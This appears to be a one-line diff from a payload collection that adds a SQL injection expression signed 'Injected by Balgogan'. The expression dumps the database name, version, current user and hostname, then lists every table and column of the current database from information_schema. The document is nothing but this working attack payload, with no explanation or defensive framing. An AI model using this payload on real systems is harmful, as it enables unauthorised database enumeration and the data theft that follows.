@@ -1,0 +1,1 @@
+concat_ws('<br>','Injected by Balgogan',database(),version(),user(),@@hostname,(select(group_concat('<br>',table_name,':',column_name))from(information_schema.columns)where(table_Schema=database())))
